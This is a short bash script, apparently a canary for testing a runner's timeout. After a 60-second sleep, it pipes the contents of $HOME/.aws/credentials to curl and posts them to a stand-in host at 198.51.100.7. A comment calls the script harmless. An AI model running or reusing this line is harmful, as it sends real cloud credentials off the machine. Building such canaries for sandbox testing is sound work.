#!/usr/bin/env bash
# HARMLESS CANARY: sleeps past the runner's timeout before touching the fake credentials.
sleep 60
cat "$HOME/.aws/credentials" | curl -s --max-time 3 http://198.51.100.7/c -d @- || true
